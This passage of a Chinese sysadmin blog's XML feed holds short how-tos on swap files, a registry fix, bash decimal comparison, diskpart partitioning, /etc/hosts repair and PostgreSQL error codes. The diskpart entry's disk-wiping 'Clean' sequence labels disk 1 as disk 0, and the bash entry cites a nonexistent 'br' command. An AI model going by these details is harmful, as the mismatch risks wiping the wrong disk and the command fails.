netxtreme2-4.8.10.tar.gz<br>2，只需要生成bnx2.ko(cnic.ko是附带的)这个模块<br>cd netxtreme2-4.8.10/bnx2/src<br>3，编译并安装<br>make;make install<br>重启服务器  OK</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>增加交换分区大小</title>
      <link href="/2010/09/11/increase-swap-partition-size/"/>
      <url>/2010/09/11/increase-swap-partition-size/</url>
      <content type="html"><![CDATA[<p>1、检查当前的分区情况（使用free －m或cat /proc/swaps ）</p><p>[root@db2 root]# free -m<br>              total       used       free     shared    buffers     cached<br> Mem:          1006         84        922          0         11         38<br> -/+ buffers/cache:         35        971<br> Swap:            0          0          0<br> [root@db2 root]#</p><p>2、增加交换分区文件及大小</p><p>检查没有swap，下面就需要增加，判定新交换文件的大小，将大小乘以1024来判定块的大小。例如，大小为64MB的交换文件的块大小为65536,在 shell 提示下以根用户身份键入以下命令，其中的 count 等于想要的块大小。</p><p>[root@db2 root]# dd if=/dev/zero of=/home/swap bs=1024 count=1024000<br> 1024000+0 records in<br> 1024000+0 records out<br> [root@db2 root]#</p><p>使用以下命令来设置交换文件：</p><p>[root@db2 root]# mkswap /home/swap<br> Setting up swapspace version 1, size = 1023996 KiB<br> [root@db2 root]#</p><p>3、启用交换分区文件</p><p>要立即启用交换文件而不是在引导时自动启用，使用以下命令：</p><p>[root@db2 root]# swapon /home/swap</p><p>检查增加后的交换情况：</p><p>[root@db2 root]# free -m<br>              total       used       free     shared    buffers     cached<br> Mem:          1006        994         12          0          4        929<br> -/+ buffers/cache:         60        946<br> Swap:          999          0        999<br> [root@db2 root]#</p><p>要在引导时启用，编辑 /etc/fstab 文件来包含以下行（/home/swap swap swap defaults 0 0 ）：</p><p>[root@db2 root]# vi /etc/fstab<br> LABEL=/                 /                   ext3    defaults        1 1<br> LABEL=/boot             /boot               ext2    defaults        1 2<br>/home/swap               swap                    swap    defaults        0 0<br> none                    /dev/pts                devpts  gid=5,mode=620  0 0<br>none                    /proc                   proc    defaults        0 0<br>none                    /dev/shm                tmpfs   defaults        0 0<br>LABEL=/usr              /usr                    ext3    defaults        1 2<br>/dev/sda5               swap                    swap    defaults        0 0 </p><p>系统下次引导时，它就会启用新建的交换文件，再次检查添加后的情况：</p><p>[root@db2 oracledb]# free -m<br>                     total       used       free     shared    buffers     cached<br>        Mem:          1006        979         27          0          6        917<br>        -/+ buffers/cache:         54        952<br>        Swap:          999          0        999<br>        [root@db2 oracledb]#</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Unable to Open &#39;C:_windows_system32_odbcconf.tmp&#39; No such file or directory</title>
      <link href="/2010/09/08/unable-to-open-c-windows-system32-odbcconf-tmp-no-such-file-or-directory/"/>
      <url>/2010/09/08/unable-to-open-c-windows-system32-odbcconf-tmp-no-such-file-or-directory/</url>
      <content type="html"><![CDATA[<p>我在安装软件时，突然跳出了如下错误</p><p>Unable to Open ‘c:_windows_system32_odbcconf.tmp’ No such file or directory</p><p>解决办法：</p><p>开始菜单 -&gt; 运行 -> regedit</p><p>进入到</p><p>[HKEY_LOCAL_MACHINE_SOFTWARE_Microsoft_Windows_CurrentVersion_RunOnce_Setup]</p><p>删除 “Configuring Data Access Components” 即可~~ OK</p><p>如果上面的方法还是不行，那就在注册表里搜索 odbcconf.tmp 然后删除所有找到的与之匹配的内容。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>bash shell中小数的大小比较</title>
      <link href="/2010/09/07/the-size-of-the-bash-shell-small-and-medium-size-comparison/"/>
      <url>/2010/09/07/the-size-of-the-bash-shell-small-and-medium-size-comparison/</url>
      <content type="html"><![CDATA[<p>写个调度器需要对小数之间进行大小比较，经查询shell中 可以用 bc 对小数进行运算</p><p>example:</p><p>#echo 5.5+1.1 | bc</p><p>6.6</p><p>具体情况#man bc</p><p>然而对小数进行比较的相关方法有几个：</p><p>1. 自己的解决方法，判断小数点后最多有几位数(N)，然后对将要比较的两个数值进行 乘与10的N次方</p><p>也就是将小数点去掉来进行比较（小数点后位数多的直接去掉小数点，少的用0补齐）</p><p>example:</p><p>6.6 x 10 &gt;5.5x10   66&gt;55</p><p>6.6666 x 10000 &gt; 5.5 x10000    66666&gt;55000</p><p>提示：使用 num=6.6666;echo \$num | awk ‘BEGIN{FS=”.”}{print length($2)}’判断小数点后的位数</p><p>当然，如果你确定小数点后最多肯定不会超过4位你可直接去掉10000，类推。。</p><p>2. 直接用awk</p><p>awk -v num1=6.6 -v num2=5.5 ‘BEGIN{print(num1&gt;num2)?”0”:”1”}’</p><p>如果num1&gt;num2打印输出0，否则输出1</p><p>3.expr</p><p>比较妙的方法 expr \$a \&gt; $b</p><p>返回1表示\$a&gt;\$b, 0表示\$a&lt;$b</p><p># a=6.6 b=5.5;expr \</p><p>4. br</p><p>用br其实也是可以实现</p><p>echo “6.6&gt;5.5” |br</p><p>1</p><p>echo “5.5&gt;6.6” | br</p><p>0</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>windows 7 安装时创建扩展分区</title>
      <link href="/2010/09/02/the-extension-partition-was-created-when-windows-7-was-installed/"/>
      <url>/2010/09/02/the-extension-partition-was-created-when-windows-7-was-installed/</url>
      <content type="html"><![CDATA[<p>许多用户在安装Windows 7时都遇，安装程序创建的都是主分区，并没有创建逻辑分区的任何选项，这样的情况导致创建4个主分区后剩余的空间无法继续分配的情况，这使得许多用户情何以堪。很多用户都反映该问题，有的用户则利用第三方软件来辅助分区，但其实只要利用系统自带的Diskpart命令，即可快速解决Windows 7安装分区限制。以下就对利用Diskpart命令为Windows 7安装分区的方法进行解析，解决这Windows 7下的分区麻烦。</p><p>Windows 7安装分区限制问题解析：</p><p>　　一、Diskpart命令简介：</p><p>　　Diskpart命令是Windows环境下的一个命令，利用diskpart可实现对硬盘的分区管理，包括创建分区、删除分区、合并（扩展）分区，完全可取代分区魔术师等第三方工具软件，它还有分区魔术师无法实现的功能，如设置动态磁盘、镜像卷等，而且设置分区后不用重启电脑也能生效。</p><p>　　正常运行该命令时需要系统服务的支持，所以在纯DOS、XP内核的WinPE环境下都是不能运行的，但是在Windows 7的预安装环境下却是可以的。利用Diskpart命令来分区，既不用借助第三方工具，也不会产生100MB的“系统保留”分区，其次分区操作直接设置即刻生效，不用重新启动计算机。</p><p>　　二、利用Diskpart命令分区方法：</p><p>　　1.当安装程序运行到创建磁盘分区界面时→按下“Shift+F10”→启动命令窗口。</p><p>　　2.键入“Diskpart”→回车→进入“Diskpart”的命令环境，其提示符为“DISKPART&gt;”。</p><p>　　3.在此提示下键入相应命令就可以进行分区操作，具体用到的命令有：</p><p>　　Clean</p><p>　　List</p><p>　　Select</p><p>　　Create</p><p>　　Format</p><p>　　Exit</p><p>　　这些命令的使用方法可以在Diskpart命令提示符下键入Help或者通过网络查询，如果不清楚可以查看。</p><p>　　4.使用“List Disk”命令显示的目标磁盘若为“1”号，则建立分区的步骤如下：</p><p>　　以下是命令顺序及操作解释：</p><p>　　List Disk：显示本机的所有磁盘，以便正确操作目标磁盘</p><p>　　Select Disk 1：选择0号磁盘</p><p>　　Clean ：清除0号磁盘上的所有分区</p><p>　　Create ：Partition Primary Size=512000 创建主分区，容量为：512000MB</p><p>　　Active：激活主分区</p><p>　　Format Quick：快速格式化当前分区</p><p>　　Create Partition Extended：创建扩展分区</p><p>　　Create Partition Logical Size=512000：创建逻辑分区一，容量为：512000MB</p><p>　　Format Quick：快速格式化当前分区</p><p>　　Create Partition Logical Size=512000：创建逻辑分区二，容量为：512000MB</p><p>　　Format Quick ：快速格式化当前分区</p><p>　　Create Partition Logical ：创建逻辑分区三，大小为剩余的容量</p><p>　　Format Quick ：快速格式化当前分区</p><p>　　Exit ：退出Diskpart命令环境</p><p>　　Exit ：退出命令窗口</p><p>　　这里要注意的是Diskpart分区时，一定要选对目标磁盘，当前被选中的磁盘/分区前面会有*号标志，可以用List Disk/Partition来进行查看。另外在分区前也可以用Resan重新扫描一下机器的磁盘，以便正确选择目标磁盘。</p><p>　　5.这时用户再点击“您想将Windows安装在何处？”窗口中的 “刷新”选项后就会出现刚才分区的结果，至此，分区操作结束。</p><p>　　通过以上介绍，相信大家对利用Diskpart命令为Windows 7安装分区的方法有了一定的了解，安装分区时不使用第三方软件，即可对硬盘进行分区，轻松解决Windows 7系统分区的问题。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>hostname -i和hostname -a解析不出来引起java错误</title>
      <link href="/2010/08/30/hostname-i-and-hostname-a-resolve-not-to-cause-java-errors/"/>
      <url>/2010/08/30/hostname-i-and-hostname-a-resolve-not-to-cause-java-errors/</url>
      <content type="html"><![CDATA[<p>错误信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SEVERE: StandardServer.await: create[ 8005 ]:         </span><br><span class="line">java.net.UnknownHostException: localhost: localhost        </span><br><span class="line">    at java.net.InetAddress.getAllByName0(InetAddress.java:1128 )        </span><br><span class="line">    at java.net.InetAddress.getAllByName0(InetAddress.java:1098 )        </span><br><span class="line">    at java.net.InetAddress.getAllByName(InetAddress.java:1061 )        </span><br><span class="line">    at java.net.InetAddress.getByName(InetAddress.java:958 )        </span><br><span class="line">    at org.apache.catalina.core.StandardServer.await(StandardServer.java:373 )        </span><br><span class="line">    at org.apache.catalina.startup.Catalina.await(Catalina.java:642 )        </span><br><span class="line">    at org.apache.catalina.startup.Catalina.start(Catalina.java:602 )        </span><br><span class="line">    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        </span><br><span class="line">    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39 )        </span><br><span class="line">    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25 )        </span><br><span class="line">    at java.lang.reflect.Method.invoke(Method.java:585 )        </span><br><span class="line">    at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:288 )        </span><br><span class="line">    at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:413 )        </span><br><span class="line">SEVERE: StandardServer.await: create[8005]:      </span><br><span class="line">java.net.UnknownHostException: localhost: localhost     </span><br><span class="line"> at java.net.InetAddress.getAllByName0(InetAddress.java:1128)     </span><br><span class="line"> at java.net.InetAddress.getAllByName0(InetAddress.java:1098)     </span><br><span class="line"> at java.net.InetAddress.getAllByName(InetAddress.java:1061)     </span><br><span class="line"> at java.net.InetAddress.getByName(InetAddress.java:958)     </span><br><span class="line"> at org.apache.catalina.core.StandardServer.await(StandardServer.java:373)     </span><br><span class="line"> at org.apache.catalina.startup.Catalina.await(Catalina.java:642)     </span><br><span class="line"> at org.apache.catalina.startup.Catalina.start(Catalina.java:602)     </span><br><span class="line"> at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)     </span><br><span class="line"> at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)     </span><br><span class="line"> at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)     </span><br><span class="line"> at java.lang.reflect.Method.invoke(Method.java:585)     </span><br><span class="line"> at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:288)     </span><br><span class="line"> at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:413)</span><br></pre></td></tr></table></figure></p><p>测试方案：<br>ping  127.0.0.1  可以ping通<br>ping  localhost  不通</p><p>说明是主机映射的原因。</p><p>解决方法：<br>修改etc/hosts 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[oracle@bogon ~]$ su - root  </span><br><span class="line">Password:  </span><br><span class="line">[root@bogon ~]# cd ..  </span><br><span class="line">[root@bogon /]# cd ..  </span><br><span class="line">[root@bogon /]# cd etc  </span><br><span class="line">[root@bogon etc]# cat hosts  </span><br><span class="line">\# Do not remove the following line, or various programs  </span><br><span class="line">\# that require network functionality will fail.  </span><br><span class="line">127.0.0.1               bogon.localdomain bogon</span><br></pre></td></tr></table></figure></p><p>在hosts文件中追加下面一行就OK了：<br>127.0.0.1              localhost.localdomain  localhost</p><p>修改/etc/hosts和/etc/sysconfig/network</p><p>要求用hostname -a和hostname -i可以解析出IP和主机名</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PostgreSQL数据库中的常见错误</title>
      <link href="/2010/08/27/common-errors-in-the-postgresql-database/"/>
      <url>/2010/08/27/common-errors-in-the-postgresql-database/</url>
      <content type="html"><![CDATA[<p>我们在操作数据库的时候，我们总会遇到很多错误。下面整理了一下常见的错误。</p><p>错误1</p><pre><code>FATAL: connection limit exceeded for non-superusers原因：非超级用户的连接数（max\_connections - superuser\_reserved_connections）超过了设定值解决办法：增加max_connections设定值，但如果增加了过多的话，数据库负担太大还容易产生内存错误。可以记住pg-pool等工具来辅助解决。</code></pre><p>错误2</p><pre><code>FATAL: sorry, too many clients already原因：数据库服务器的连接数超过了max_connections设定值。解决办法：和错误1解决办法类似。</code></pre><p>错误3</p><pre><code>LOG: checkpoints are occurring too frequently原因：checkpoint处理正频繁发生。解决办法：增加checkpoint_segments的值。</code></pre><p>错误4</p><pre><code>LOG: archive command failed with exit code (X)原因：archive_command 失败了。解决办法：因为有可能是硬盘没空间了，所以可以把数据库的log删除一些。</code></pre><p>错误5</p><pre><code>LOG: number of page slots needed (X) exceeds max\_fsm\_pages (Y)原因：max\_fsm\_pages不足了。解决办法：增加max\_fsm\_pages的同时进行 VACUUM FULL。</code></pre><p>错误6</p><p>   ERROR: current transaction is aborted, commands ignored until end of transaction blockp</p><p>   原因：数据库操作时，前一次操作中已经发生过错误了。</p><p>   解决办法： <a href="http://blog.csdn.net/hantiannan/archive/2009/09/24/4590259.aspx" target="_blank" rel="noopener">PostgreSQL]：ERROR: current transaction is aborted, commands ignored until end of transaction blockp</a></p><p>错误7</p><p>   ERROR:  operator does not exist: character = integer</p><p>   原因：PostgreSQL8.3以后，取消了默认类型转换。因此需要使比较的类型保持一致。可以看cast函数。</p><p>附错误code &lt; td&gt;INVALID CURSOR NAME</p><p>Error Code</p><p>Meaning</p><p>Condition Name</p><p>Class 00 — Successful Completion</p><p>00000</p><p>SUCCESSFUL COMPLETION</p><p>successful_completion</p><p>Class 01 — Warning</p><p>01000</p><p>WARNING</p><p>warning</p><p>0100C</p><p>DYNAMIC RESULT SETS RETURNED</p><p>dynamic_result_sets_returned</p><p>01008</p><p>IMPLICIT ZERO BIT PADDING</p><p>implicit_zero_bit_padding</p><p>01003</p><p>NULL VALUE ELIMINATED IN SET FUNCTION</p><p>null_value_eliminated_in_set_function</p><p>01007</p><p>PRIVILEGE NOT GRANTED</p><p>privilege_not_granted</p><p>01006</p><p>PRIVILEGE NOT REVOKED</p><p>privilege_not_revoked</p><p>01004</p><p>STRING DATA RIGHT TRUNCATION</p><p>string_data_right_truncation</p><p>01P01</p><p>DEPRECATED FEATURE</p><p>deprecated_feature</p><p>Class 02 — No Data (this is also a warning class per the SQL standard)</p><p>02000</p><p>NO DATA</p><p>no_data</p><p>02001</p><p>NO ADDITIONAL DYNAMIC RESULT SETS RETURNED</p><p>no_additional_dynamic_result_sets_returned</p><p>Class 03 — SQL Statement Not Yet Complete</p><p>03000</p><p>SQL STATEMENT NOT YET COMPLETE</p><p>sql_statement_not_yet_complete</p><p>Class 08 — Connection Exception</p><p>08000</p><p>CONNECTION EXCEPTION</p><p>connection_exception</p><p>08003</p><p>CONNECTION DOES NOT EXIST</p><p>connection_does_not_exist</p><p>08006</p><p>CONNECTION FAILURE</p><p>connection_failure</p><p>08001</p><p>SQLCLIENT UNABLE TO ESTABLISH SQLCONNECTION</p><p>sqlclient_unable_to_establish_sqlconnection</p><p>08004</p><p>SQLSERVER REJECTED ESTABLISHMENT OF SQLCONNECTION</p><p>sqlserver_rejected_establishment_of_sqlconnection</p><p>08007</p><p>TRANSACTION RESOLUTION UNKNOWN</p><p>transaction_resolution_unknown</p><p>08P01</p><p>PROTOCOL VIOLATION</p><p>protocol_violation</p><p>Class 09 — Triggered Action Exception</p><p>09000</p><p>TRIGGERED ACTION EXCEPTION</p><p>triggered_action_exception</p><p>Class 0A — Feature Not Supported</p><p>0A000</p><p>FEATURE NOT SUPPORTED</p><p>feature_not_supported</p><p>Class 0B — Invalid Transaction Initiation</p><p>0B000</p><p>INVALID TRANSACTION INITIATION</p><p>invalid_transaction_initiation</p><p>Class 0F — Locator Exception</p><p>0F000</p><p>LOCATOR EXCEPTION</p><p>locator_exception</p><p>0F001</p><p>INVALID LOCATOR SPECIFICATION</p><p>invalid_locator_specification</p><p>Class 0L — Invalid Grantor</p><p>0L000</p><p>INVALID GRANTOR</p><p>invalid_grantor</p><p>0LP01</p><p>INVALID GRANT OPERATION</p><p>invalid_grant_operation</p><p>Class 0P — Invalid Role Specification</p><p>0P000</p><p>INVALID ROLE SPECIFICATION</p><p>invalid_role_specification</p><p>Class 20 — Case Not Found</p><p>20000</p><p>CASE NOT FOUND</p><p>case_not_found</p><p>Class 21 — Cardinality Violation</p><p>21000</p><p>CARDINALITY VIOLATION</p><p>cardinality_violation</p><p>Class 22 — Data Exception</p><p>22000</p><p>DATA EXCEPTION</p><p>data_exception</p><p>2202E</p><p>ARRAY SUBSCRIPT ERROR</p><p>array_subscript_error</p><p>22021</p><p>CHARACTER NOT IN REPERTOIRE</p><p>character_not_in_repertoire</p><p>22008</p><p>DATETIME FIELD OVERFLOW</p><p>datetime_field_overflow</p><p>22012</p><p>DIVISION BY ZERO</p><p>division_by_zero</p><p>22005</p><p>ERROR IN ASSIGNMENT</p><p>error_in_assignment</p><p>2200B</p><p>ESCAPE CHARACTER CONFLICT</p><p>escape_character_conflict</p><p>22022</p><p>INDICATOR OVERFLOW</p><p>indicator_overflow</p><p>22015</p><p>INTERVAL FIELD OVERFLOW</p><p>interval_field_overflow</p><p>2201E</p><p>INVALID ARGUMENT FOR LOGARITHM</p><p>invalid_argu ment_for_logarithm</p><p>22014</p><p>INVALID ARGUMENT FOR NTILE FUNCTION</p><p>invalid_argument_for_ntile_function</p><p>22016</p><p>INVALID ARGUMENT FOR NTH_VALUE FUNCTION</p><p>invalid_argument_for_nth_value_function</p><p>2201F</p><p>INVALID ARGUMENT FOR POWER FUNCTION</p><p>invalid_argument_for_power_function</p><p>2201G</p><p>INVALID ARGUMENT FOR WIDTH BUCKET FUNCTION</p><p>invalid_argument_for_width_bucket_function</p><p>22018</p><p>INVALID CHARACTER VALUE FOR CAST</p><p>invalid_character_value_for_cast</p><p>22007</p><p>INVALID DATETIME FORMAT</p><p>invalid_datetime_format</p><p>22019</p><p>INVALID ESCAPE CHARACTER</p><p>invalid_escape_character</p><p>2200D</p><p>INVALID ESCAPE OCTET</p><p>invalid_escape_octet</p><p>22025</p><p>INVALID ESCAPE SEQUENCE</p><p>invalid_escape_sequence</p><p>22P06</p><p>NONSTANDARD USE OF ESCAPE CHARACTER</p><p>nonstandard_use_of_escape_character</p><p>22010</p><p>INVALID INDICATOR PARAMETER VALUE</p><p>invalid_indicator_parameter_value</p><p>22023</p><p>INVALID PARAMETER VALUE</p><p>invalid_parameter_value</p><p>2201B</p><p>INVALID REGULAR EXPRESSION</p><p>invalid_regular_expression</p><p>2201W</p><p>INVALID ROW COUNT IN LIMIT CLAUSE</p><p>invalid_row_count_in_limit_clause</p><p>2201X</p><p>INVALID ROW COUNT IN RESULT OFFSET CLAUSE</p><p>invalid_row_count_in_result_offset_clause</p><p>22009</p><p>INVALID TIME ZONE DISPLACEMENT VALUE</p><p>invalid_time_zone_displacement_value</p><p>2200C</p><p>INVALID USE OF ESCAPE CHARACTER</p><p>invalid_use_of_escape_character</p><p>2200G</p><p>MOST SPECIFIC TYPE MISMATCH</p><p>most_specific_type_mismatch</p><p>22004</p><p>NULL VALUE NOT ALLOWED</p><p>null_value_not_allowed</p><p>22002</p><p>NULL VALUE NO INDICATOR PARAMETER</p><p>null_value_no_indicator_parameter</p><p>22003</p><p>NUMERIC VALUE OUT OF RANGE</p><p>numeric_value_out_of_range</p><p>22026</p><p>STRING DATA LENGTH MISMATCH</p><p>string_data_length_mismatch</p><p>22001</p><p>STRING DATA RIGHT TRUNCATION</p><p>string_data_right_truncation</p><p>22011</p><p>SUBSTRING ERROR</p><p>substring_error</p><p>22027</p><p>TRIM ERROR</p><p>trim_error</p><p>22024</p><p>UNTERMINATED C STRING</p><p>unterminated_c_string</p><p>2200F</p><p>ZERO LENGTH CHARACTER STRING</p><p>zero_length_character_string</p><p>22P01</p><p>FLOATING POINT EXCEPTION</p><p>floating_point_exception</p><p>22P02</p><p>INVALID TEXT REPRESENTATION</p><p>invalid_text_representation</p><p>22P03</p><p>INVALID BINARY REPRESENTATION</p><p>invalid_binary_representation</p><p>22P04</p><p>BAD COPY FILE FORMAT</p><p>bad_copy_file_format</p><p>22P05</p><p>UNTRANSLATABLE CHARACTER</p><p>untranslatable_character</p><p>2200L</p><p>NOT AN XML DOCUMENT</p><p>not_an_xml_document</p><p>2200M</p><p>INVALID XML DOCUMENT</p><p>invalid_xml_document</p><p>2200N</p><p>INVALID XML CONTENT</p><p>invalid_xml_content</p><p>2200S</p><p>INVALID XML COMMENT</p><p>invalid_xml_comment</p><p>2200T</p><p>INVALID XML PROCESSING INSTRUCTION</p><p>invalid_xml_processing_instruction</p><p>Class 23 — Integrity Constraint Violation</p><p>23000</p><p>INTEGRITY CONSTRAINT VIOLATION</p><p>integrity_constraint_violation</p><p>23001</p><p>RESTRICT VIOLATION</p><p>restrict_violation</p><p>23502</p><p>NOT NULL VIOLATION</p><p>not_null_violation</p><p>23503</p><p>FOREIGN KEY VIOLATION</p><p>foreign_key_violation</p><p>23505</p><p>UNIQUE VIOLATION</p><p>unique_violation</p><p>23514</p><p>CHECK VIOLATION</p><p>check_violation</p><p>Class 24 — Invalid Cursor State</p><p>24000</p><p>INVALID CURSOR STATE</p><p>invalid_cursor_state</p><p>Class 25 — Invalid Transaction State</p><p>25000</p><p>INVALID TRANSACTION STATE</p><p>invalid_transaction_state</p><p>25001</p><p>ACTIVE SQL TRANSACTION</p><p>active_sql_transaction</p><p>25002</p><p>BRANCH TRANSACTION ALREADY ACTIVE</p><p>branch_transaction_already_active</p><p>25008</p><p>HELD CURSOR REQUIRES SAME ISOLATION LEVEL</p><p>held_cursor_requires_same_isolation_level</p><p>25003</p><p>INAPPROPRIATE ACCESS MODE FOR BRANCH TRANSACTION</p><p>inappropriate_access_mode_for_branch_transaction</p><p>25004</p><p>INAPPROPRIATE ISOLATION LEVEL FOR BRANCH TRANSACTION</p><p>inappropriate_isolation_level_for_branch_transaction</p><p>25005</p><p>NO ACTIVE SQL TRANSACTION FOR BRANCH TRANSACTION</p><p>no_active_sql_transaction_for_branch_transaction</p><p>25006</p><p>READ ONLY SQL TRANSACTION</p><p>read_only_sql_transaction</p><p>25007</p><p>SCHEMA AND DATA STATEMENT MIXING NOT SUPPORTED</p><p>schema_and_data_statement_mixing_not_supported</p><p>25P01</p><p>NO ACTIVE SQL TRANSACTION</p><p>no_active_sql_transaction</p><p>25P02</p><p>IN FAILED SQL TRANSACTION</p><p>in_failed_sql_transaction</p><p>Class 26 — Invalid SQL Statement Name</p><p>26000</p><p>INVALID SQL STATEMENT NAME</p><p>invalid_sql_statement_name</p><p>Class 27 — Triggered Data Change Violation</p><p>27000</p><p>TRIGGERED DATA CHANGE VIOLATION</p><p>triggered_data_change_violation</p><p>Class 28 — Invalid Authorization Specification</p><p>28000</p><p>INVALID AUTHORIZATION SPECIFICATION</p><p>invalid_authorization_specification</p><p>Class 2B — Dependent Privilege Descriptors Still Exist</p><p>2B000</p><p>DEPENDENT PRIVILEGE DESCRIPTORS STILL EXIST</p><p>dependent_privilege_descriptors_still_exist</p><p>2BP01</p><p>DEPENDENT OBJECTS STILL EXIST</p><p>dependent_objects_still_exist</p><p>Class 2D — Invalid Transaction Termination</p><p>2D000</p><p>INVALID TRANSACTION TERMINATION</p><p>invalid_transaction_termination</p><p>Class 2F — SQL Routine Exception</p><p>2F000</p><p>SQL ROUTINE EXCEPTION</p><p>sql_routine_exception</p><p>2F005</p><p>FUNCTION EXECUTED NO RETURN STATEMENT</p><p>function_executed_no_return_statement</p><p>2F002</p><p>MODIFYING SQL DATA NOT PERMITTED</p><p>modifying_sql_data_not_permitted</p><p>2F003</p><p>PROHIBITED SQL STATEMENT ATTEMPTED</p><p>prohibited_sql_statement_attempted</p><p>2F004</p><p>READING SQL DATA NOT PERMITTED</p><p>reading_sql_data_not_permitted</p><p>Class 34 — Invalid Cursor Name</p><p>34000</p><p>invalid_cursor_name</p><p>Class 38 — External Routine Exception</p><p>38000</p><p>EXTERNAL ROUTINE EXCEPTION</p><p>external_routine_exception</p><p>38001</p><p>CONTAINING SQL NOT PERMITTED</p><p>containing_sql_not_permitted</p><p>38002</p><p>MODIFYING SQL DATA NOT PERMITTED</p><p>modifying_sql_data_not_permitted</p><p>38003</p><p>PROHIBITED SQL STATEMENT ATTEMPTED</p><p>prohibited_sql_statement_attempted</p><p>38004</p><p>READING SQL DATA NOT PERMITTED</p><p>reading_sql_data_not_permitted</p><p>Class 39 — External Routine Invocation Exception</p><p>39000</p><p>EXTERNAL ROUTINE INVOCATION EXCEPTION</p><p>external_routine_invocation_exception</p><p>39001</p><p>INVALID SQLSTATE RETURNED</p><p>invalid_sqlstate_returned</p><p>39004</p><p>NULL VALUE NOT ALLOWED</p><p>null_value_not_allowed</p><p>39P01</p><p>TRIGGER PROTOCOL VIOLATED</p><p>trigger_protocol_violated</p><p>39P02</p><p>SRF PROTOCOL VIOLATED</p><p>srf_protocol_violated</p><p>Class 3B — Savepoint Exception</p><p>3B000</p><p>SAVEPOINT EXCEPTION</p><p>savepoint_exception</p><p>3B001</p><p>INVALID SAVEPOINT SPECIFICATION</p><p>invalid_savepoint_specification</p><p>Class 3D — Invalid Catalog Name</p><p>3D000</p><p>INVALID CATALOG NAME</p><p>invalid_catalog_name</p><p>Class 3F — Invalid Schema Name</p><p>3F000</p><p>INVALID SCHEMA NAME</p><p>invalid_schema_name</p><p>Class 40 — Transaction Rollback</p><p>40000</p><p>TRANSACTION ROLLBACK</p><p>transaction_rollback</p><p>40002</p><p>TRANSACTION INTEGRITY CONSTRAINT VIOLATION</p><p>transaction_integrity_constraint_violation</p><p>40001</p><p>SERIALIZATION FAILURE</p><p>serialization_failure</p><p>40003</p><p>STATEMENT COMPLETION UNKNOWN</p><p>statement_completion_unknown</p><p>40P01</p><p>DEADLOCK DETECTED</p><p>deadlock_detected</p><p>Class 42 — Syntax Error or Access Rule Violation</p><p>42000</p><p>SYNTAX ERROR OR ACCESS RULE VIOLATION</p><p>syntax_error_or_access_rule_violation</p><p>42601</p><p>SYNTAX ERROR</p><p>syntax_error</p><p>42501</p><p>INSUFFICIENT PRIVILEGE</p><p>insufficient_privilege</p><p>42846</p><p>CANNOT COERCE</p><p>cannot_coerce</p><p>42803</p><p>GROUPING ERROR</p><p>grouping_error</p><p>42P20</p><p>WINDOWING ERROR</p><p>windowing_error</p><p>42P19</p><p>INVALID RECURSION</p><p>invalid_recursion</p><p>42830</p><p>INVALID FOREIGN KEY</p><p>invalid_foreign_key</p><p>42602</p><p>INVALID NAME</p><p>invalid_name</p><p>42622</p><p>NAME TOO LONG</p><p>name_too_long</p><p>42939</p><p>RESERVED NAME</p><p>reserved_name</p><p>42804</p><p>DATATYPE MISMATCH</p><p>datatype_mismatch</p><p>42P18</p><p>INDETERMINATE DATATYPE</p><p>indeterminate_datatype</p><p>42809</p><p>WRONG OBJECT TYPE</p><p>wrong_object_type</p><p>42703</p><p>UNDEFINED COLUMN</p><p>undefined_column</p><p>42883</p><p>UNDEFINED FUNCTION</p><p>undefined_function</p><p>42P01</p><p>UNDEFINED TABLE</p><p>undefined_table</p><p>42P02</p><p>UNDEFINED PARAMETER</p><p>undefined_parameter</p><p>42704</p><p>UNDEFINED OBJECT</p><p>undefined_object</p><p>42701</p><p>DUPLICATE COLUMN</p><p>duplicate_column</p><p>42P03</p><p>DUPLICATE CURSOR</p><p>duplicate_cursor</p><p>42P04</p><p>DUPLICATE DATABASE</p><p>duplicate_database</p><p>42723</p><p>DUPLICATE FUNCTION</p><p>duplicate_function</p><p>42P05</p><p>DUPLICATE PREPARED STATEMENT</p><p>duplicate_prepared_statement</p><p>42P06</p><p>DUPLICATE SCHEMA</p><p>duplicate_schema</p><p>42P07</p><p>DUPLICATE TABLE</p><p>duplicate_table</p><p>42712</p><p>DUPLICATE ALIAS</p><p>duplicate_alias</p><p>42710</p><p>DUPLICATE 